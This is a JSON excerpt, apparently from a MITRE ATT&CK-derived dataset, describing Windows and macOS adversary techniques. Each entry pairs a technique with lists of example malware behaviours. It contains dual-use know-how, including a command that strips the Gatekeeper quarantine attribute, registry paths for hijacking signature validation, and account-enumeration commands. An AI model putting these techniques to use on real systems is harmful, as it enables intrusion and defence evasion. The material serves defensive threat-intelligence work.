    "example_uses": [
      "Install-SSP Persistence module can be used to establish by installing a SSP DLL.",
      "The  credential dumper contains an implementation of an SSP."
    ],
    "id": "T1101",
    "name": "Security Support Provider",
    "similar_words": [
      "Security Support Provider"
    ]
  },
  "attack-pattern--6e6845c2-347a-4a6f-a2d1-b74a18ebd352": {
    "description": "The Windows security subsystem is a set of components that manage and enforce the security policy for a computer or domain. The Local Security Authority (LSA) is the main component responsible for local security policy and user authentication. The LSA includes multiple dynamic link libraries (DLLs) associated with various other security functions, all of which run in the context of the LSA Subsystem Service (LSASS) lsass.exe process. (Citation: Microsoft Security Subsystem)\n\nAdversaries may target lsass.exe drivers to obtain execution and/or persistence. By either replacing or adding illegitimate drivers (e.g., [DLL Side-Loading](https://attack.mitre.org/techniques/T1073) or [DLL Search Order Hijacking](https://attack.mitre.org/techniques/T1038)), an adversary can achieve arbitrary code execution triggered by continuous LSA operations.",
    "example_uses": [
      "establishes by infecting the Security Accounts Manager (SAM) DLL to load a malicious DLL dropped to disk.",
      "drops a malicious file (sspisrv.dll) alongside a copy of lsass.exe, which is used to register a service that loads sspisrv.dll as a driver. The payload of the malicious driver (located in its entry-point function) is executed when loaded by lsass.exe before the spoofed service becomes unstable and crashes."
    ],
    "id": "T1177",
    "name": "LSASS Driver",
    "similar_words": [
      "LSASS Driver"
    ]
  },
  "attack-pattern--6faf650d-bf31-4eb4-802d-1000cf38efaf": {
    "description": "An adversary can leverage a computer's peripheral devices (e.g., integrated cameras or webcams) or applications (e.g., video call services) to capture video recordings for the purpose of gathering information. Images may also be captured from devices or applications, potentially in specified intervals, in lieu of video files.Malware or scripts may be used to interact with the devices through an available API provided by the operating system or an application to capture video or images. Video or image files may be written to disk and exfiltrated later. This technique differs from [Screen Capture](https://attack.mitre.org/techniques/T1113) due to use of specific devices or applications for video recording rather than capturing the victim's screen.In macOS, there are a few different malware samples that record the user's webcam such as FruitFly and Proton. (Citation: objective-see 2017 review)",
    "example_uses": [
      "captures images from the webcam.",
      "created a custom video recording capability that could be used to monitor operations in the victim's environment.",
      "has modules that are capable of capturing from a victim's webcam.",
      "has the capability to access the webcam on the victim’s machine.",
      "can perform webcam viewing.",
      "can remotely activate the victim’s webcam to capture content.",
      "can access a connected webcam and capture pictures.",
      "is capable of capturing video.",
      "has the capability to capture video from a victim machine.",
      "uses the Skype API to record audio and video calls. It writes encrypted data to %APPDATA%\\Intel\\Skype.",
      "can capture webcam data on Windows and macOS systems.",
      "can record screen content in AVI format.",
      "can capture webcam video on targeted systems.",
      "has the ability to capture webcam video.",
      "has a feature to access the webcam on the victims machine.",
      "can access the victim's webcam and capture data.",
      "has the capability to capture video from a webcam.",
      "takes photos from the computers web camera.",
      "has the ability to access the webcam.",
      "can access the victims webcam to take pictures.",
      "can access the victim's webcam.",
      "can access the victims webcam and record video.",
      "has used a Python tool named Bewmac to record the webcam on compromised hosts.",
      "has been observed making videos of victims to observe bank employees day to day activities.",
      "has a remote webcam monitoring capability.",
      "can record video on remote hosts.",
      "can record screen content on targeted systems.",
      "has the ability to record video on a compromised host.",
      "has a command to perform video device spying.",
      "can access the webcam on a victim's machine.",
      "has modules that are capable of capturing video from a victim's webcam.",
      "can access a systems webcam and take pictures.",
      "can remotely activate the victims webcam to capture content.",
      "can capture images from webcams on compromised hosts.",
      "can capture camera video as part of its collection process.",
      "has exfiltrated images from compromised IP cameras.",
      "allows for the remote administrator to view the interactive session of the running machine including full screen activity."
    ],
    "id": "T1125",
    "name": "Video Capture",
    "similar_words": [
      "Video Capture"
    ]
  },
  "attack-pattern--6fb6408c-0db3-41d9-a3a1-a32e5f16454e": {
    "description": "In macOS and OS X, when applications or programs are downloaded from the internet, there is a special attribute set on the file called com.apple.quarantine. This attribute is read by Apple's Gatekeeper defense program at execution time and provides a prompt to the user to allow or deny execution. \n\nApps loaded onto the system from USB flash drive, optical disk, external hard drive, or even from a drive shared over the local network won’t set this flag. Additionally, other utilities or events like drive-by downloads don’t necessarily set it either. This completely bypasses the built-in Gatekeeper check. (Citation: Methods of Mac Malware Persistence) The presence of the quarantine flag can be checked by the xattr command xattr /path/to/MyApp.app for com.apple.quarantine. Similarly, given sudo access or elevated permission, this attribute can be removed with xattr as well, sudo xattr -r -d com.apple.quarantine /path/to/MyApp.app. (Citation: Clearing quarantine attribute) (Citation: OceanLotus for OS X)\n \nIn typical operation, a file will be downloaded from the internet and given a quarantine flag before being saved to disk. When the user tries to open the file or application, macOS’s gatekeeper will step in and check for the presence of this flag. If it exists, then macOS will then prompt the user to confirmation that they want to run the program and will even provide the URL where the application came from. However, this is all based on the file being downloaded from a quarantine-savvy application. (Citation: Bypassing Gatekeeper)",
    "example_uses": [],
    "id": "T1144",
    "name": "Gatekeeper Bypass",
    "similar_words": [
      "Gatekeeper Bypass"
    ]
  },
  "attack-pattern--6ff403bc-93e3-48be-8687-e102fdba8c88": {
    "description": "Software packing is a method of compressing or encrypting an executable. Packing an executable changes the file signature in an attempt to avoid signature-based detection. Most decompression techniques decompress the executable code in memory.\n\nUtilities used to perform software packing are called packers. Example packers are MPRESS and UPX. A more comprehensive list of known packers is available, (Citation: Wikipedia Exe Compression) but adversaries may create their own packing techniques that do not leave the same artifacts as well-known packers to evade defenses.",
    "example_uses": [
      "has used UPX to pack ",
      "uses the SmartAssembly obfuscator to pack an embedded .Net Framework assembly used for C2.",
      "leverages a custom packer to obfuscate its functionality.",
      "is initially packed.",
      "packs a plugin with UPX.",
      "has packed malware payloads before delivery to victims.",
      "A  variant uses a custom packer.",
      "Some  DLL files have been packed with UPX.",
      "has been known to pack their tools.",
      "A version of  uses the MPRESS packer.",
      "uses a custom packing algorithm.",
      "uses a custom packer.",
      "has been packed with the UPX packer.",
      "samples sometimes use common binary packers such as UPX and Aspack on top of a custom Delphi binary packer.",
      "packed an executable by base64 encoding the PE file and breaking it up into numerous lines.",
      "A  payload was packed with UPX.",
      "used UPX to pack files.",
      "is known to use software packing in its tools."
    ],
    "id": "T1045",
    "name": "Software Packing",
    "similar_words": [
      "Software Packing"
    ]
  },
  "attack-pattern--707399d6-ab3e-4963-9315-d9d3818cd6a0": {
    "description": "Adversaries may look for details about the network configuration and settings, such as IP and/or MAC addresses, of systems they access or through information discovery of remote systems. Several operating system administration utilities exist that can be used to gather this information. Examples include [Arp](https://attack.mitre.org/software/S0099), [ipconfig](https://attack.mitre.org/software/S0100)/[ifconfig](https://attack.mitre.org/software/S0101), [nbtstat](https://attack.mitre.org/software/S0102), and [route](https://attack.mitre.org/software/S0103).Adversaries may also leverage a [Network Device CLI](https://attack.mitre.org/techniques/T1059/008) on network devices to gather information about configurations and settings, such as IP addresses of configured interfaces and static/dynamic routes (e.g. show ip route, show ip interface).(Citation: US-CERT-TA18-106A)(Citation: Mandiant APT41 Global Intrusion ) On ESXi, adversaries may leverage esxcli to gather network configuration information. For example, the command `esxcli network nic list` will retrieve the MAC address, while `esxcli network ip interface ipv4 get` will retrieve the local IPv4 address.(Citation: Trellix Rnasomhouse 2024)Adversaries may use the information from [System Network Configuration Discovery](https://attack.mitre.org/techniques/T1016) during automated discovery to shape follow-on behaviors, including determining certain access within the target network and what actions to do next. ",
    "example_uses": [
      "used batch scripts to enumerate network information, including information about trusts, zones, and the domain.",
      "gathers the Mac address, IP address, and the network adapter information from the victim’s machine.",
      "has the capability to gather the IP address from the victim's machine.",
      "gathers informatin on the IP forwarding table, MAC address, and network SSID.",
      "uses the ipconfig /all command to gather the victim’s IP address.",
      "can gather the IP address from the victim's machine.",
      "runs ipconfig /all and collects the domain name.",
      "gathers information about network adapters.",
      "gathers the local IP address.",
      "used an HTTP malware variant and a Port 22 malware variant to collect the MAC address and IP address from the victim’s machine.",
      "gathers network configuration information as well as the ARP cache.",
      "can execute ipconfig on the victim’s machine.",
      "collects information about the Internet adapter configuration.",
      "collects the victim IP address, MAC address, as well as the victim account domain name.",
      "uses the ipconfig command.",
      "collects the network adapter information.",
      "collects network adapter and interface information by using the commands ipconfig /all, arp -a and route print. It also collects the system's MAC address with getmac and domain configuration with net config workstation.",
      "uses ipconfig /all and route PRINT to identify network adapter and interface information.",
      "can retrieve information about the Windows domain.",
      "runs the ifconfig command to obtain the IP address from the victim’s machine.",
      "collects the network adapter information and domain/username information based on current remote sessions.",
      "obtains the IP address from the victim’s machine.",
      "will look for the current IP address.",
      "gathers the IP address and domain from the victim’s machine.",
      "gathers the victim’s IP address via the ipconfig -all command.",
      "has the capability to gather the victim's proxy information.",
      "gathers the MAC address of the victim’s machine.",
      "gathers the current domain the victim system belongs to.",
      "can gather information about the victim proxy server.",
      "can obtain network information, including DNS, IP, and proxies.",
      "A  variant gathers network interface card information.",
      "creates a backdoor through which remote attackers can retrieve IP addresses of compromised machines.",
      "gathers the victim's IP address and domain information, and then sends it to its C2 server.",
      "can retrieve IP and network adapter configuration information from compromised hosts.",
      "collects the domain name from a compromised host.",
      "has built in commands to identify a host’s IP address and find out other network configuration settings by viewing connected sessions.",
      "can gather victim proxy information.",
      "malware gathers the victim's local IP address, MAC address, and external IP address.",
      "collects the victim LAN IP address and sends it to the C2 server.",
      "discovers the current domain information.",
      "collects MAC address and local IP address information from the victim.",
      "collects the victim's IP address.",
      "may collect network configuration data by running ipconfig /all on a victim.",
      "has run ipconfig /all on a victim.",
      "collects the network adapter’s IP and MAC address as well as IP addresses of the network adapter’s default gateway, primary/secondary WINS, DHCP, and DNS servers, and saves them into a log file.",
      "has used several tools to scan for open NetBIOS nameservers and enumerate NetBIOS sessions.",
      "A module in  collects information from the victim about its IP addresses and MAC addresses.",
      "has the capability to execute the command ipconfig /all.",
      "has gathered information about network IP configurations using .exe and about routing tables using .exe.",
      "can be used to display ARP configuration information on the host.",
      "has a command to get the victim's domain and NetBIOS name.",
      "contains a command to collect the victim MAC address and LAN IP.",
      "collects information on network settings and Internet proxy settings from the victim.",
      "actors use nbtscan to discover vulnerable systems.",
      "can obtain information about network configuration, including the routing table, ARP cache, and DNS cache.",
      "collects the local IP address of the victim and sends it to the C2.",
      "may create a file containing the results of the command cmd.exe /c ipconfig /all.",
      "executes ipconfig /all after initial communication is made to the remote server.",
      "has a command to collect the victim's IP address.",
      "can be used to display adapter configuration on Windows systems, including information for TCP/IP, DNS, and DHCP.",
      "can be used to discover local NetBIOS domain names.",
      "gathers and beacons the MAC and IP addresses during installation.",
      "obtains the victim IP address.",
      "The reconnaissance modules used with  can collect information on network configuration.",
      "can be used to display adapter configuration on Unix systems, including information for TCP/IP, DNS, and DHCP.",
      "can be used to discover routing configuration information.",
      "can obtain information about the victim's IP address.",
      "may use ipconfig /all to gather system network configuration details.",
      "obtains the target's IP address and local network segment.",
      "can obtain information about network parameters.",
      "malware gathers the Address Resolution Protocol (ARP) table from the victim.",
      "malware IndiaIndia obtains and sends to its C2 server information about the first network interface card’s configuration, including IP address, gateways, subnet mask, DHCP information, and whether WINS is available.",
      "A keylogging tool used by  gathers network information from the victim, including the MAC address, IP address, WINS, DHCP server, and gateway.",
      "uses commands such as netsh interface show to discover network interface settings.",
      "actors used the following command after exploiting a machine with  malware to acquire information about local networks: ipconfig /all >> %temp%\\download",
      "surveys a system upon check-in to discover network configuration details using the arp -a, nbtstat -n, and net config commands.",
      "performs local network configuration discovery using ipconfig.",
      "has collected the MAC address from the victim's machine.",
      "can enumerate the IP address of a compromised host.",
      "can be used to display adapter configuration on Unix systems including information for TCP/IP DNS and DHCP.",
      "has used  and `tracert` for network discovery.",
      "collects the IP address of a compromised system.",
      "has used ipconfig and arp to determine network configuration information.",
      "has the ability to identify network settings on a compromised host.",
      "uses API calls to enumerate the infected system's ARP table.",
      "can retrieve the contents of the IP routing table as well as information about the Windows domain.",
      "can collect the IP address of a compromised host.",
      "The   module can iterate over all network interfaces on the host and retrieve the name description MAC address DNS suffix DNS servers gateways IPv4 addresses and subnet masks.",
      "can collect IP information from the victims machine.",
      "can acquire network configuration information like DNS servers public IP and network proxies used by a host.",
      "can enumerate network adapter information.",
      "can determine the public or WAN IP address for the system.",
      "gathers the MAC address of the victims machine.",
      "can determine the NetBios name and the IP addresses of targets machines including domain controllers.",
      "gathers the IP address from the victims machine.",
      "can perform network reconnaissance using the Advanced IP Scanner tool.",
      "can use  and  to collect network configuration information including routing information and ARP tables.",
      "has the ability to execute the `ipconfig` command.",
      "collects the victim IP address MAC address as well as the victim account domain name.",
      "has used batch scripts to enumerate network information including information about trusts zones and the domain.",
      "can be used to collect MAC addresses.",
      "can collect the MAC address and other information from a victim machine using `ipconfig/all`.",
      "has collected the domain name of a compromised network.",
      "can collect the IP address of a victim machine.",
      "can collect the network interface MAC address on the infected host.",
      "can collect the IP address from the victims machine.",
      "has the ability to identify the IP address of the compromised host.",
      "can obtain network information including DNS IP and proxies.",
      "can obtain the proxy settings of a compromised machine using `InternetQueryOptionA` and its IP address by running `nslookup myip.opendns.comresolver1.opendns.com\\r\\n`.",
      "can collect the victims IP address.",
      "can identify the IP of a targeted system.",
      "During  the threat actors used `ipconfig` `nbtstat` `tracert` `route print` and `cat /etc/hosts` commands.",
      "can collect the IP address of the victim machine and spawn instances of netsh.exe to enumerate wireless settings.",
      "During   used `cmd.exe /c ping %userdomain%` for discovery.",
      "can run `C:\\Windows\\system32\\cmd.exe /c cmd /c ipconfig /all 2>&1` to discover network settings.",
      "used an HTTP malware variant and a Port 22 malware variant to collect the MAC address and IP address from the victims machine.",
      "has the ability to discover the proxy configuration of Firefox and/or Opera.",
      "has used `nslookup` and `ipconfig` for network reconnaissance efforts.  has also utilized a compromised Symantec Altiris console and LanDesk account to retrieve network information.",
      "runs the ifconfig command to obtain the IP address from the victims machine.",
      "can identify the IP address of a compromised host.",
      "can gather the IP address from the victim's machine using the IP config command.",
      "can collect network information including the host IP address DNS and proxy information.",
      "has the ability to identify the location public IP address and domain name on a compromised host.",
      "gathers the IP address and domain from the victims machine.",
      "can identify the MAC address on the target computer.",
      "can collect IP addresses from a compromised host.",
      "has executed multiple commands to enumerate network topology and settings including `ipconfig` `netsh interface firewall show all` and `netsh interface portproxy show all`.",
      "can enumerate the IP address on compromised systems.",
      "malware IndiaIndia obtains and sends to its C2 server information about the first network interface cards configuration including IP address gateways subnet mask DHCP information and whether WINS is available.",
      "checked if the compromised system is configured to use proxies.",
      "can collect the IP address of the victims and other computers on the network using the commands: ipconfig -all nbtstat -n and nbtstat -s.",
      "A keylogging tool used by  gathers network information from the victim including the MAC address IP address WINS DHCP server and gateway.",
      "can report the IP of the compromised host to attacker controlled infrastructure.",
      "has used malware to collect the victims IP address and domain name.",
      "can enumerate the IP and domain of a target system.",
      "uses ipconfig to gather the IP address from the system.",
      "has built in commands to identify a hosts IP address and find out other network configuration settings by viewing connected sessions.",
      "has identified the IP address of a compromised host.",
      "has collected the MAC address of a compromised host; it can also use GetAdaptersInfo to identify network adapters.",
      "can find the external IP address of the infected host.",
      "can extract subnet information from Active Directory.",
      "retrieved a list of the system's network interface after execution.",
      "has collected the DNS address of the infected host.",
      "can retrieve the IP address of a compromised host.",
      "gathers the victim's IP address and domain information and then sends it to its C2 server.",
      "uses the ipconfig /all command to gather the victims IP address.",
      "has the ability to collect the MAC address of an infected host.",
      "used the ipconfig /all command to gather network configuration information.",
      "has used scripts to collect the host's network topology.",
      "can obtain the IP address of a victim host.",
      "enumerates the IP address network proxy settings and domain name from a victim's system.",
      "actors use  to discover vulnerable systems.",
      "can record the IP address of the target machine.",
      "collects the MAC address of the target computer and other network configuration information.",
      "can collect the host IP address from the victims machine.",
      "collected all network interface MAC addresses that are up and not loopback devices as well as IP address DHCP configuration and domain information.",
      "has performed local network configuration discovery using ipconfig.",
      "uses the ifconfig -a command.",
      "can detect the infected machine's network topology using ipconfig and arp.",
      "can use net config workstation arp -a `nslookup` and ipconfig /all to gather network configuration information.",
      "can obtain the victim IP address.",
      "collects information about the network including the IP address and DHCP server.",
      "can retrieve the ARP cache from the local system by using the GetIpNetTable() API call and check to ensure IP addresses it connects to are for local non-Internet systems.",
      "can determine the domain of a compromised host.",
      "has used the GetAdaptersInfo() API call to get the victim's MAC address.",
      "can retrieve the ARP cache from the local system by using GetIpNetTable.",
      "During  the threat actors used  for discovery on remote systems.",
      "runs the ipconfig /all command.",
      "has the ability to identify the domain of the compromised host.",
      "can parse the `ProxyServer` string in the Registry to discover http proxies.",
      "gathers information on the IP forwarding table MAC address configured proxy and network SSID.",
      "can identify the domain of the compromised host.",
      "s 61850 payload component enumerates connected network adapters and their corresponding IP addresses.",
      "has used   and tracert to enumerate the IP address and network environment and settings of the local host.",
      "can identify the IP address of the victim system.",
      "can identify the IP of a compromised system.",
      "has collected the victim machine's local IP address information and MAC address.",
      "can enumerate IP addresses using `GetIpAddrTable`.",
      "can use `getmac` and `Get-NetIPAddress` to enumerate network settings.",
      "collects the external IP address from the system.",
      "has collected the domain name of the victim system.",
      "malware gathers the victim's local IP address MAC address and external IP address.",
      "used a script to gather the IP address of the infected machine before sending to the C2.",
      "has the ability to gather network configuration information.",
      "can use the Linux API `if_nameindex` to gather network interface names.",
      "can identify the default proxy setting on a compromised host.",
      "can obtain proxy information from a victim's machine using system environment variables.",
      "gathers the victims IP address via the ipconfig -all command.",
      "can retrieve IP network adapter configuration information and domain from compromised hosts.",
      "can use  to discover a target's network configuration setttings.",
      "has the ability to identify the domain and the MAC and IP addresses of an infected machine.",
      "collects the IP address and MAC address from the system.",
      "has the ability to identify the MAC address on an infected host.",
      "has the ability to collect the domain name on a compromised host.",
      "gathers information about network adapters using the Win32 API call GetAdaptersInfo.",
      "has the ability to enumerate the Wide Area Network (WAN) IP through requests to ip-api[.]com freegeoip[.]net or api[.]ipify[.]org observed with user-agent string `Mozilla/5.0 (Windows NT 6.3; rv:48.0) Gecko/20100101 Firefox/48.0`.",
      "can use the `GetAdaptersInfo` function to retrieve information about network adapters and the `GetIpNetTable` function to retrieve the IPv4 to physical network address mapping table.",
      "has the ability to determine the domain name and whether a proxy is configured on a compromised host.",
      "can collect the TCP/IP DNS DHCP and network adapter configuration on a compromised host via ipconfig.exe /all.",
      "can collect the IP address and NetBIOS name of an infected machine.",
      "has used malware to collect information on network interfaces including the MAC address.",
      "surveys a system upon check-in to discover network configuration details using the arp -a nbtstat -n net config ipconfig /all and route commands as well as .  RPC backdoors have also retrieved registered RPC interface information from process memory.",
      "can collect the host's IP addresses using the ipconfig command.",
      "has used  to identify the network configuration of a victim machine.  has also used the PowerShell cmdlet `Get-ADComputer` to collect IP address data from Active Directory.",
      "can retrieve the internal IP address of a compromised host.",
      "gathers the Mac address IP address and the network adapter information from the victims machine.",
      "can enumerate victims' local and external IPs when registering with C2.",
      "has used `ipconfig /all` on a compromised host.",
      "has enumerated the host machines IP address.",
      "can determine the public IP and location of a compromised host.",
      "has the ability to identify the current Windows domain of the infected host.",
      "collected MAC addresses from victim machines.",
      "can identify the IP address and user domain on the target machine.",
      "used ipconfig /all to obtain information about the victim network configuration. The group also ran a modified version of  to identify available NetBIOS name servers.",
      "can discover the DNS domain name of a targeted system.",
      "has a command to get the public IP address from a system.",
      "has used `ipconfig/all` to gather network configuration information.",
      "will attempt to determine the local network segment it is a part of.",
      "has the ability to collect the IP address of an infected host.",
      "can be used to display adapter configuration on Windows systems including information for TCP/IP DNS and DHCP.",
      "has been used to execute the ipconfig /all command on a victim system.",
      "has collected the IP address and network adapter information from the victims machine.",
      "During  the threat actors ran `nslookup` and Advanced IP Scanner on the target network.",
      "has captured victim IP address details.",
      "can obtain information about network configuration including the routing table ARP cache and DNS cache.",
      "has collected IP information via IPInfo.",
      "can gather the IP address from an infected host.",
      "can gather information on the network configuration of a compromised host.",
      "gathered the local proxy domain IP routing tables mac address gateway DNS servers and DHCP status information from an infected host.",
      "has the ability to use ipconfig to enumerate system network settings.",
      "can retrieve network interface and proxy information.",
      "identifies the victim system MAC and IPv4 addresses and uses these to establish a victim identifier.",
      "can collect the victim's MAC address by using the GetAdaptersInfo API.",
      "used the ipconfig /all command to gather the IP address from the system.",
      "uses the nbtstat -n and nbtstat -s commands on the victims machine.",
      "has the ability to identify the IP of the infected host.",
      "can determine the IP and physical location of the compromised host via IPinfo.",
      "has executed the ipconfig /all command.",
      "collects network adapter and interface information by using the commands ipconfig /all arp -a and route print. It also collects the system's MAC address with getmac and domain configuration with net config workstation.",
      "has the ability to discover the domain name of the infected host.",
      "used ipconfig to gather network configuration information.",
      "During  the threat actors used  to find the public IP address of a compromised system.",
      "can collect host IP information from the victims machine.",
      "may be used to enumerate the parent domain of a local machine using /parentdomain.",
      "can collected the IP address and domain name of a compromised host.",
      "collects the network adapters IP and MAC address as well as IP addresses of the network adapters default gateway primary/secondary WINS DHCP and DNS servers and saves them into a log file.",
      "has the ability to identify the MAC address of a compromised host.",
      "can retrieve network information from a compromised host.",
      "can collect DNS information from the targeted system.",
      "can collect the external IP address of the victim.",
      "During  threat actors discovered the local network configuration with `ipconfig`.",
      "can identify the IP and MAC addresses of the compromised host.",
      "used the command ipconfig to obtain information about network configurations.",
      "can gather information on the victim IP address.",
      "can execute ipconfig on the victims machine.",
      "can enumerate the IP address of a compromised machine.",
      "During  the threat actors used code to obtain the external public-facing IPv4 address of the compromised host.",
      "can collect and send the local IP address RDP information and the network adapter physical address as a part of its C2 beacon.",
      "has called GetIpNetTable in attempt to identify all mounted drives and hosts that have Address Resolution Protocol (ARP) entries.",
      "can gather victim internal and external IPs.",
      "has used a tool to enumerate proxy settings in the target environment.",
      "has the ability to identify the IP address of the compromised machine.",
      "can collect IP addresses and local intranet information from a victims machine.",
      "can collect the local MAC address using `GetAdaptersInfo` as well as the system's IP address.",
      "obtains the IP address location and other relevant network information from the victims machine.",
      "can detect network adapter and IP address information.",
      "has the ability to enumerate the domain name of a victim as well as if the host is a member of an Active Directory domain.",
      "has collected the victims external IP address.",
      "can identify the IP address of a victim machine.",
      "gathers victim network information through commands such as ipconfig and ipconfig /all.",
      "has used the information-stealing tool Grixba to enumerate network information.",
      "can discover the IP and MAC address of a targeted host.",
      "can verify the targeted host's DNS name which is then used in the creation of a decyrption key.",
      "gathers information about current network connections local and remote addresses associated with them and associated processes.",
      "gathers victim IP information during initial installation stages.",
      "can use shell commands to discover network adapters and configuration.",
      "can enumerate infected system network information.",
      "can use an embedded script to check the IP address of potential victims visiting compromised websites.",
      "gathers information on victim system network configuration such as MAC addresses.",
      "has gathered information on victim network configuration.",
      "has used `ipconfig/all` and web beacons sent via email to gather network configuration information.",
      "used the `ipconfig /all` command and a batch script to gather network information.",
      "used tools such as  to pull system network information and identify connected devices.",
      "will gather system information such as MAC and IP addresses.",
      "has used commands such as `ipconfig` and `netstat` to gather network information on compromised hosts.",
      "collects the MAC address of victim devices.",
      "can compare the host and remote IPs to check if a received packet is from the infected machine.",
      "has used malware such as GHAMBAR and POWERPOST to collect network information.",
      "collects system network information using commands such as `ipconfig /all`.",
      "can discover the IP for the network interface on the compromised device.",
      "enumerates network interfaces on the infected host.",
      "captures the IP address of the victim system and sends this to the attacker following encryption.",
      "collects network information on infected systems such as listing interface names MAC and IP addresses and IPv6 addresses.",
      "During  threat actors invoked DNS queries from targeted machines to identify their IP addresses."
    ],
    "id": "T1016",
    "name": "System Network Configuration Discovery",
    "similar_words": [
      "System Network Configuration Discovery"
    ]
  },
  "attack-pattern--72b5ef57-325c-411b-93ca-a3ca6fa17e31": {
    "description": "In user mode, Windows Authenticode (Citation: Microsoft Authenticode) digital signatures are used to verify a file's origin and integrity, variables that may be used to establish trust in signed code (ex: a driver with a valid Microsoft signature may be handled as safe). The signature validation process is handled via the WinVerifyTrust application programming interface (API) function,  (Citation: Microsoft WinVerifyTrust) which accepts an inquiry and coordinates with the appropriate trust provider, which is responsible for validating parameters of a signature. (Citation: SpectorOps Subverting Trust Sept 2017)\n\nBecause of the varying executable file types and corresponding signature formats, Microsoft created software components called Subject Interface Packages (SIPs) (Citation: EduardosBlog SIPs July 2008) to provide a layer of abstraction between API functions and files. SIPs are responsible for enabling API functions to create, retrieve, calculate, and verify signatures. Unique SIPs exist for most file formats (Executable, PowerShell, Installer, etc., with catalog signing providing a catch-all  (Citation: Microsoft Catalog Files and Signatures April 2017)) and are identified by globally unique identifiers (GUIDs). (Citation: SpectorOps Subverting Trust Sept 2017)\n\nSimilar to [Code Signing](https://attack.mitre.org/techniques/T1116), adversaries may abuse this architecture to subvert trust controls and bypass security policies that allow only legitimately signed code to execute on a system. Adversaries may hijack SIP and trust provider components to mislead operating system and whitelisting tools to classify malicious (or any) code as signed by: (Citation: SpectorOps Subverting Trust Sept 2017)\n\n* Modifying the Dll and FuncName Registry values in HKLM\\SOFTWARE[\\WOW6432Node\\]Microsoft\\Cryptography\\OID\\EncodingType 0\\CryptSIPDllGetSignedDataMsg\\{SIP_GUID} that point to the dynamic link library (DLL) providing a SIP’s CryptSIPDllGetSignedDataMsg function, which retrieves an encoded digital certificate from a signed file. By pointing to a maliciously-crafted DLL with an exported function that always returns a known good signature value (ex: a Microsoft signature for Portable Executables) rather than the file’s real signature, an adversary can apply an acceptable signature value all files using that SIP (Citation: GitHub SIP POC Sept 2017) (although a hash mismatch will likely occur, invalidating the signature, since the hash returned by the function will not match the value computed from the file).\n* Modifying the Dll and FuncName Registry values in HKLM\\SOFTWARE\\[WOW6432Node\\]Microsoft\\Cryptography\\OID\\EncodingType 0\\CryptSIPDllVerifyIndirectData\\{SIP_GUID} that point to the DLL providing a SIP’s CryptSIPDllVerifyIndirectData function, which validates a file’s computed hash against the signed hash value. By pointing to a maliciously-crafted DLL with an exported function that always returns TRUE (indicating that the validation was successful), an adversary can successfully validate any file (with a legitimate signature) using that SIP (Citation: GitHub SIP POC Sept 2017) (with or without hijacking the previously mentioned CryptSIPDllGetSignedDataMsg function). This Registry value could also be redirected to a suitable exported function from an already present DLL, avoiding the requirement to drop and execute a new file on disk.\n* Modifying the DLL and Function Registry values in HKLM\\SOFTWARE\\[WOW6432Node\\]Microsoft\\Cryptography\\Providers\\Trust\\FinalPolicy\\{trust provider GUID} that point to the DLL providing a trust provider’s FinalPolicy function, which is where the decoded and parsed signature is checked and the majority of trust decisions are made. Similar to hijacking SIP’s CryptSIPDllVerifyIndirectData function, this value can be redirected to a suitable exported function from an already present DLL or a maliciously-crafted DLL (though the implementation of a trust provider is complex).\n* **Note:** The above hijacks are also possible without modifying the Registry via [DLL Search Order Hijacking](https://attack.mitre.org/techniques/T1038).\n\nHijacking SIP or trust provider components can also enable persistent code execution, since these malicious components may be invoked by any application that performs code signing or signature validation. (Citation: SpectorOps Subverting Trust Sept 2017)",
    "example_uses": [],
    "id": "T1198",
    "name": "SIP and Trust Provider Hijacking",
    "similar_words": [
      "SIP and Trust Provider Hijacking"
    ]
  },
  "attack-pattern--72b74d71-8169-42aa-92e0-e7b04b9f5a08": {
    "description": "Adversaries may attempt to get a listing of valid accounts, usernames, or email addresses on a system or within a compromised environment. This information can help adversaries determine which accounts exist, which can aid in follow-on behavior such as brute-forcing, spear-phishing attacks, or account takeovers (e.g., [Valid Accounts](https://attack.mitre.org/techniques/T1078)).Adversaries may use several methods to enumerate accounts, including abuse of existing tools, built-in commands, and potential misconfigurations that leak account names and roles or permissions in the targeted environment.For examples, cloud environments typically provide easily accessible interfaces to obtain user lists.(Citation: AWS List Users)(Citation: Google Cloud - IAM Servie Accounts List API) On hosts, adversaries can use default [PowerShell](https://attack.mitre.org/techniques/T1059/001) and other command line functionality to identify accounts. Information about email addresses and accounts may also be extracted by searching an infected systems files.",
    "example_uses": [
      "gathers information on local groups and members on the victim’s machine.",
      "has a command to list account information on the victim’s machine.",
      "gathers domain and account names/information through process monitoring.",
      "collects the users of the system.",
      "uses the net user command.",
      "collects a list of accounts with the command net users.",
      "uses the net user command.",
      "used batch scripts to enumerate users in the victim environment.",
      "Get-ProcessTokenGroup Privesc-PowerUp module can enumerate all SIDs associated with its current token.",
      "has the capability to retrieve information about users on remote hosts.",
      "uses PowerView and Pywerview to perform discovery commands such as net user, net group, net local group, etc.",
      "can retrieve usernames from compromised hosts.",
      "has run net user, net user /domain, net group “domain admins” /domain, and net group “Exchange Trusted Subsystem” /domain to get account listings on a victim.",
      "enumerates local and domain users",
      "has used net user /domain to identify account information.",
      "may collect user account information by running net user /domain or a series of other commands on a victim.",
      "has used the Microsoft administration tool csvde.exe to export Active Directory data.",
      "may create a file containing the results of the command cmd.exe /c net user {Username}.",
      "may use net group \"domain admins\" /domain to display accounts in the \"domain admins\" permissions group and net localgroup \"administrators\" to list local system administrator group membership.",
      "runs the command net user on a victim.  also runs tests to determine the privilege level of the compromised user.",
      "can obtain a list of users.",
      "has used net user to conduct internal discovery of systems.",
      "The discovery modules used with  can collect information on accounts and permissions.",
      "has a command to retrieve information about connected users.",
      "executes net user after initial communication is made to the remote server.",
      "collects information on local user accounts from the victim.",
      "Commands under net user can be used in  to gather information about and manipulate user accounts.",
      "can be used to gather information on user accounts within a domain.",
      "has used Metasploit’s  NTDSGRAB module to obtain a copy of the victim's Active Directory database.",
      "searches for administrator accounts on both the local victim machine and the network.",
      "has used a tool that can obtain info about local and global group users, power users, and administrators.",
      "actors used the following commands following exploitation of a machine with  malware to enumerate user accounts: net user >> %temp%\\download net user /domain >> %temp%\\download",
      "performs account discovery using commands such as net localgroup administrators and net group \"REDACTED\" /domain on specific permissions groups.",
      "listed all non-privileged and privileged accounts available on the machine.",
      "can identify administrator accounts on an infected machine.",
      "attempts to discover accounts from various locations such as a user's Evernote AppleID Telegram Skype and WeChat data.",
      "During the   obtained a list of users and their roles from an Exchange server using `Get-ManagementRoleAssignment`.",
      "has enumerated all users and their roles from a victim's main treasury system.",
      "used the last command in Linux environments to identify recently logged-in users on victim machines."
    ],
    "id": "T1087",
    "name": "Account Discovery",
    "similar_words": [
      "Account Discovery"
    ]
  },
